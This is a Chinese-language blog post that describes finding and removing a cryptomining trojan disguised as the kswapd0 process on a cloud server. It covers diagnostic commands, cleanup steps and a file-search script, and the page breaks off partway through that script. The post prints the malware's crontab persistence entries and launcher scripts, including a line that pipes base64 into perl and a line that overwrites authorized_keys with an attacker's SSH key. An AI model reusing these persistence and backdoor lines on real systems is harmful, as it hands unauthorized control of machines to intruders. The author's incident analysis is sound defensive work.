<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>伪装为kswapd0进程的挖矿木马 | Hexo</title><meta name="author" content="CJ"><meta name="copyright" content="CJ"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、起因腾讯云给我发了几封邮件说我的服务器被木马攻击。 我打开服务器监控一看，闲置的服务器CPU飙升。 二、排查2.1 首先查询CPU占用最多的3个进程查使用内存最多的K个进程 方式一：ps -aux | sort -k3nr | head -K  sort参数说明：  |选项	|说明   |—————|—————————————————————————   |-n   |依照数值的大小排序，不加">
<meta property="og:type" content="article">
<meta property="og:title" content="伪装为kswapd0进程的挖矿木马">
<meta property="og:url" content="http://example.com/2023/05/06/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/%E4%BC%AA%E8%A3%85%E4%B8%BAkswapd0%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="一、起因腾讯云给我发了几封邮件说我的服务器被木马攻击。 我打开服务器监控一看，闲置的服务器CPU飙升。 二、排查2.1 首先查询CPU占用最多的3个进程查使用内存最多的K个进程 方式一：ps -aux | sort -k3nr | head -K  sort参数说明：  |选项	|说明   |—————|—————————————————————————   |-n   |依照数值的大小排序，不加">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
<meta property="article:published_time" content="2023-05-06T05:31:21.075Z">
<meta property="article:modified_time" content="2023-05-06T05:31:21.075Z">
<meta property="article:author" content="CJ">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/05/06/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/%E4%BC%AA%E8%A3%85%E4%B8%BAkswapd0%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '伪装为kswapd0进程的挖矿木马',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-05-06 13:31:21'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">419</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">38</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">伪装为kswapd0进程的挖矿木马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-06T05:31:21.075Z" title="发表于 2023-05-06 13:31:21">2023-05-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-06T05:31:21.075Z" title="更新于 2023-05-06 13:31:21">2023-05-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">系统安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="伪装为kswapd0进程的挖矿木马"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一、起因"><a href="#一、起因" class="headerlink" title="一、起因"></a>一、起因</h1><p>腾讯云给我发了几封邮件说我的服务器被木马攻击。<br><img src="/%E4%BC%AA%E8%A3%85%E4%B8%BAkswapd0%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC.assets%5C69c5affcdaa54e4e87c4bf8c7eb88a98.png" alt="image.png"></p>
<p>我打开服务器监控一看，闲置的服务器CPU飙升。<br><img src="/%E4%BC%AA%E8%A3%85%E4%B8%BAkswapd0%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC.assets%5C8bdd61431a61450eb6ca72de4047cd45.png" alt="image.png"></p>
<h1 id="二、排查"><a href="#二、排查" class="headerlink" title="二、排查"></a>二、排查</h1><h2 id="2-1-首先查询CPU占用最多的3个进程"><a href="#2-1-首先查询CPU占用最多的3个进程" class="headerlink" title="2.1 首先查询CPU占用最多的3个进程"></a>2.1 首先查询CPU占用最多的3个进程</h2><p><strong>查使用内存最多的K个进程</strong></p>
<p>方式一：<code>ps -aux | sort -k3nr | head -K</code><br><img src="/%E4%BC%AA%E8%A3%85%E4%B8%BAkswapd0%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC.assets%5C41932a1a06c74682a1019e1b0e9f2338.png" alt="image.png"></p>
<blockquote>
<p><strong>sort参数说明：</strong><br>  |选项	|说明<br>   |—————|—————————————————————————<br>   |-n   |依照数值的大小排序，不加-n按字符串大小排序<br>   |-r	  |以相反的顺序来排序<br>   |-t	  |设置排序时所用的分隔字符<br>   |-k   |指定需要排序的列<br>   |-u   |去重</p>
</blockquote>
<p>方式二：输入 <code>top</code> ，  然后输入大写P（输入大写M是按内存倒排）<br><img src="/%E4%BC%AA%E8%A3%85%E4%B8%BAkswapd0%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC.assets%5C2207f43032d34d89aca11aa29c985562.png" alt="image.png"></p>
<p><code>最终发现是kswapd0进程在作乱。</code></p>
<h2 id="2-2-排查kswapd0进程"><a href="#2-2-排查kswapd0进程" class="headerlink" title="2.2 排查kswapd0进程"></a>2.2 排查kswapd0进程</h2><h3 id="2-2-1-执行命令netstat-antlp-grep-kswapd0-查询该进程的网络信息"><a href="#2-2-1-执行命令netstat-antlp-grep-kswapd0-查询该进程的网络信息" class="headerlink" title="2.2.1 执行命令netstat -antlp | grep kswapd0 查询该进程的网络信息"></a>2.2.1 执行命令<code>netstat -antlp | grep kswapd0</code> 查询该进程的网络信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-0-13-centos etc]# netstat -antlp | grep kswapd0</span><br><span class="line">tcp        0      0 172.17.0.13:55402       45.9.148.129:80         ESTABLISHED 31036/./kswapd0</span><br></pre></td></tr></table></figure>
<p>发现一个与本机端口通信的是一个荷兰的ip。</p>
<br>
### 2.2.2 执行命令`netstat -antlp | grep 45.9.148` 查询该地区ip的其他网络占用情况
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-0-13-centos etc]# netstat -antlp | grep 45.9.148</span><br><span class="line">tcp        0      1 172.17.0.13:47182       45.9.148.99:443         SYN_SENT    31000/rsync         </span><br><span class="line">tcp        0      0 172.17.0.13:55402       45.9.148.129:80         ESTABLISHED 31036/./kswapd0</span><br></pre></td></tr></table></figure>

<p>发现还有一个rsync进程在工作。</p>
<p>执行 <code>ps -ef | grep 31000</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-0-13-centos etc]# ps -ef | grep 31000</span><br><span class="line">root     20734 28364  0 16:22 pts/1    00:00:00 grep --color=auto 31000</span><br><span class="line">cj       31000     1  0 14:20 ?        00:00:00 rsync</span><br></pre></td></tr></table></figure>
<p>确实有这个rsync进程在工作。</p>
<br>
### 2.2.3 查找进程的详细信息
我们来到/proc/目录下查找对应的pid号，即/proc/31000和/proc/31036。可以在这两个目录下找到rsync进程和kswapd0进程的详细信息。

<p>找到启动的脚本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc/31000/exe -&gt; /usr/bin/perl</span><br><span class="line">/proc/31036/exe -&gt; /tmp/.X25-unix/.rsync/a/kswapd0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其实应该看看cmdline文件的，但是已经被我删了。</p>
</blockquote>
<blockquote>
<p>&#x2F;proc&#x2F;pid&#x2F;cmdline 进程启动命令<br>&#x2F;proc&#x2F;pid&#x2F;cwd 链接到进程当前工作目录<br>&#x2F;proc&#x2F;pid&#x2F;environ 进程环境变量列表<br>&#x2F;proc&#x2F;pid&#x2F;exe 链接到进程的执行命令文件<br>&#x2F;proc&#x2F;pid&#x2F;fd 包含进程相关的所有的文件描述符<br>&#x2F;proc&#x2F;pid&#x2F;maps 与进程相关的内存映射信息<br>&#x2F;proc&#x2F;pid&#x2F;mem 指代进程持有的内存,不可读<br>&#x2F;proc&#x2F;pid&#x2F;root 链接到进程的根目录<br>&#x2F;proc&#x2F;pid&#x2F;stat 进程的状态<br>&#x2F;proc&#x2F;pid&#x2F;statm 进程使用的内存的状态<br>&#x2F;proc&#x2F;pid&#x2F;status 进程状态信息,比stat&#x2F;statm更具可读性<br>&#x2F;proc&#x2F;self 链接到当前正在运行的进程</p>
</blockquote>
<br>
### 2.2.4 在cj用户下查看定时任务 `crontab -l`
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[cj@VM-0-13-centos ~]$ crontab -l</span><br><span class="line">1 1 */2 * * /home/cj/.configrc/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">@reboot /home/cj/.configrc/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">5 8 * * 0 /home/cj/.configrc/b/sync&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">@reboot /home/cj/.configrc/b/sync&gt;/dev/null 2&gt;&amp;1  </span><br><span class="line">0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
还给我起了好多定时启动和重启启动的脚本。

<h4 id="2-2-4-1-查看-x2F-home-x2F-cj-x2F-configrc-x2F-a-x2F-目录"><a href="#2-2-4-1-查看-x2F-home-x2F-cj-x2F-configrc-x2F-a-x2F-目录" class="headerlink" title="2.2.4.1 查看 &#x2F;home&#x2F;cj&#x2F;.configrc&#x2F;a&#x2F; 目录"></a>2.2.4.1 查看 &#x2F;home&#x2F;cj&#x2F;.configrc&#x2F;a&#x2F; 目录</h4><p><strong>看一下upd脚本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cd /home/cj/.configrc/a</span><br><span class="line">  if test -r /home/cj/.configrc/a/bash.pid; then</span><br><span class="line">    pid=$(cat /home/cj/.configrc/a/bash.pid)</span><br><span class="line">    if $(kill -CHLD $pid &gt;/dev/null 2&gt;&amp;1); then</span><br><span class="line">      exit 0</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line">./run &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在脚本中检查了bash.pid是否存在且可读，如果存在读取该pid并杀死进程，如果杀死成功，则退出脚本，否则执行run脚本；<br><strong>bash.pid文件作用：</strong>1. pid文件的内容：pid文件为文本文件，内容只有一行, 记录了该进程的ID。用cat命令可以看到。2. pid文件的作用：防止进程启动多个副本。只有获得pid文件(固定路径固定文件名)写入权限(F_WRLCK)的进程才能正常启动并把自身的PID写入该文件中。其它同一个程序的多余进程则自动退出。</p>
</blockquote>
<br>
**查看下run脚本**
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">./stop</span><br><span class="line">./init0</span><br><span class="line">sleep 10</span><br><span class="line">pwd &gt; dir.dir</span><br><span class="line">dir=$(cat dir.dir)</span><br><span class="line">ARCH=`uname -m`</span><br><span class="line">        if [ &quot;$ARCH&quot; == &quot;i686&quot; ]; then</span><br><span class="line">                nohup ./anacron &gt;&gt;/dev/null &amp;</span><br><span class="line">        elif [ &quot;$ARCH&quot; == &quot;x86_64&quot; ];   then</span><br><span class="line">                ./kswapd0</span><br><span class="line">        fi</span><br><span class="line">echo $! &gt; bash.pid</span><br></pre></td></tr></table></figure>
>如果硬件类型是“i686”的话，就启动./anacron脚本；如果是“x86_64”的话，就启动万恶的kswapd0脚本。

<p><strong>查看下kswapd0脚本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>额，打不开，有大佬指点一下吗？</p>
</blockquote>
<h4 id="2-2-4-2-查看-x2F-home-x2F-cj-x2F-configrc-x2F-b-x2F-目录"><a href="#2-2-4-2-查看-x2F-home-x2F-cj-x2F-configrc-x2F-b-x2F-目录" class="headerlink" title="2.2.4.2 查看 &#x2F;home&#x2F;cj&#x2F;.configrc&#x2F;b&#x2F; 目录"></a>2.2.4.2 查看 &#x2F;home&#x2F;cj&#x2F;.configrc&#x2F;b&#x2F; 目录</h4><p><strong>查看sync脚本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cd /home/cj/.configrc/b</span><br><span class="line">./run</span><br></pre></td></tr></table></figure>
<blockquote>
<p>直接调用run脚本。</p>
</blockquote>
<p><strong>查看run脚本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">nohup ./stop&gt;&gt;/dev/null &amp;</span><br><span class="line">sleep 5</span><br><span class="line">echo &quot;yw5Ik......RPKjIhWyJCYEAAPzBJXX0=&quot; | base64 --decode | perl</span><br><span class="line">cd ~ &amp;&amp; rm -rf .ssh &amp;&amp; mkdir .ssh &amp;&amp; echo &quot;ssh-rsa AAB......3K+oRw== mdrfckr&quot;&gt;&gt;.ssh/authorized_keys &amp;&amp; chmod -R go= ~/.ssh</span><br></pre></td></tr></table></figure>
<blockquote>
<p>原文件字符长度有4w多字，都是一些密钥信息，将不重要的密钥信息删减了大半。该脚本主要就是将公钥写到.ssh文件中，然后就可以控制计算机了。</p>
</blockquote>
<br>
# 三、解决
1. `crontab -e`删除木马创建的定时任务。包括/var/spool/cron和/etc/cron.d目录下的定时任务文件也要排查一下。
2. 删除所有木马创建的文件。主要是/tmp/.X25-unix/，cj/.configrc文件和被篡改的.ssh文件。(见<第五章>)
3. 杀死木马创建的所有进程。(见 <第五章>)

<p><strong>如果该用户不重要，保险起见可以直接删除用户。</strong><br>查询所有用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F&quot;:&quot; &#x27;&#123; print $1&quot;|&quot;$3&quot;|&quot;$4 &#125;&#x27;|more</span><br></pre></td></tr></table></figure>
<p>删除用户及其对应的文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel -r cj</span><br></pre></td></tr></table></figure>

<br>
# 四、分析原因
发现程序是跑在cj用户名下的，那就是我创建的普通用户cj的密码太简单了。最好还是使用密钥进行登陆，密码就那么几位，不保险。

<p>但是为什么会知道我创建的用户名呢，想不明白。破解root用户不是更方便吗？</p>
<p>想起之前的一次Elasticsearch被攻击：部署的ELK集群，用于日志的采集和存储。但是发现每隔几天就会丢失数据，但是并没有人去删除这些日志，后来发现是被攻击了，Meow攻击使用自动脚本扫描开放的不安全的 Elasticsearch 和 MongoDB 数据库，找到之后直接将其删除。</p>
<br>
# 五、总结
因为侵入的是我的普通用户cj，该用户下我没有进行过任何操作且该用户没有sudo权限。所以只要是cj用户下的进程都是挖矿的。

<h4 id="木马启动的所有进程"><a href="#木马启动的所有进程" class="headerlink" title="木马启动的所有进程"></a>木马启动的所有进程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cj       31000     1  0 14:20 ?        00:00:00 rsync</span><br><span class="line">cj       31036     1 67 14:21 ?        01:37:01 ./kswapd0</span><br><span class="line">cj       31328     1  0 14:22 ?        00:00:00 /bin/bash ./go</span><br><span class="line">cj       31388 31328  0 14:22 ?        00:00:00 timeout 9h ./tsm -t 535 -f 1 -s 12 -S 9 -p 0 -d 1 p ip</span><br><span class="line">cj       31389 31388  0 14:22 ?        00:00:00 /bin/bash ./tsm -t 535 -f 1 -s 12 -S 9 -p 0 -d 1 p ip</span><br><span class="line">cj       31394 31389 27 14:22 ?        00:38:23 /tmp/.X25-unix/.rsync/c/lib/64/tsm --library-path /tmp/.X25-unix/.rsync/c/lib/64/ /usr/sbin/httpd rsync/c/tsm64 -t 535 -f 1 -s 12 -S 9 -p 0 -d 1 p ip</span><br></pre></td></tr></table></figure>
<blockquote>
<p>kswapd0是挖矿程序，tsm是爆破程序。挖矿和爆破程序像病毒一样蔓延开来。</p>
</blockquote>
<br>
#### 木马启动的所有定时任务
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[cj@VM-0-13-centos ~]$ crontab -l</span><br><span class="line">1 1 */2 * * /home/cj/.configrc/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">@reboot /home/cj/.configrc/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">5 8 * * 0 /home/cj/.configrc/b/sync&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">@reboot /home/cj/.configrc/b/sync&gt;/dev/null 2&gt;&amp;1  </span><br><span class="line">0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<br>
#### 木马创建的所有文件
**写了一个脚本来查询cj用户的所有文件，脚本如下**
`vim /root/searchfile.sh`
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> ];<span class="keyword">then</span></span><br><span class="line">  search_path=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;ERROR: SEARCH_PATH LOSED! &quot;</span></span><br><span class="line">  <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$2</span> ];<span class="keyword">then</span></span><br><span class="line">  user=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  user=cj</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$3</span> ];<span class="keyword">then</span></span><br><span class="line">  target_path=<span class="variable">$3</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  target_path=/root/cjfile</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt;&gt; <span class="variable">$target_path</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt;&gt; <span class="variable">$target_path</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;------- <span class="subst">$(date)</span> ------&quot;</span> &gt;&gt; <span class="variable">$target_path</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">search_user_file</span></span>()&#123;</span><br><span class="line">  <span class="comment"># get absolute path</span></span><br><span class="line">  <span class="built_in">local</span> DIRNAME=`<span class="built_in">cd</span> $(<span class="built_in">dirname</span> <span class="variable">$1</span>);<span class="built_in">pwd</span>`</span><br><span class="line">  <span class="built_in">local</span> BASENAME=`<span class="built_in">basename</span> <span class="variable">$1</span>`</span><br><span class="line">  <span class="built_in">local</span> init_path=<span class="variable">$DIRNAME</span>/<span class="variable">$BASENAME</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;enter path =&gt; <span class="variable">$init_path</span>&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#files=`ls -al $1 | awk -v user=$user -v dirs=&quot;&quot; &#x27;NF==9&amp;&amp;$9!=&quot;.&quot;&amp;&amp;$9!=&quot;..&quot;&amp;&amp;$3==user&#123;dirs=dirs&quot; &quot;$9&#125; END&#123;print dirs&#125;&#x27;`</span></span><br><span class="line">  <span class="built_in">local</span> files=`<span class="built_in">ls</span> -al <span class="variable">$1</span> | awk -v user=<span class="variable">$user</span> -v <span class="built_in">dirs</span>=<span class="string">&quot;&quot;</span> <span class="string">&#x27;NF==9&amp;&amp;$9!=&quot;.&quot;&amp;&amp;$9!=&quot;..&quot;&#123;dirs=dirs&quot; &quot;$9&#125; END&#123;print dirs&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;file =&gt; <span class="variable">$files</span>&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> !(<span class="built_in">test</span> -z <span class="string">&quot;<span class="variable">$files</span>&quot;</span> );<span class="keyword">then</span></span><br><span class="line">      </span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> <span class="variable">$files</span>;<span class="keyword">do</span></span><br><span class="line">      <span class="built_in">local</span> path=<span class="variable">$init_path</span>/<span class="variable">$dir</span></span><br><span class="line">      <span class="comment">#echo $path</span></span><br><span class="line">      <span class="keyword">if</span> [ -d <span class="variable">$path</span> ];<span class="keyword">then</span></span><br><span class="line">        search_user_file <span class="variable">$path</span> <span class="variable">$2</span> <span class="variable">$3</span>  </span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">local</span> owner=`<span class="built_in">ls</span> -l <span class="variable">$path</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>`</span><br><span class="line">	<span class="comment">#echo &quot;------------------owner : $owner ------------------&quot;</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$owner</span> = <span class="variable">$2</span> ];<span class="keyword">then</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="variable">$path</span> &gt;&gt; <span class="variable">$3</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span 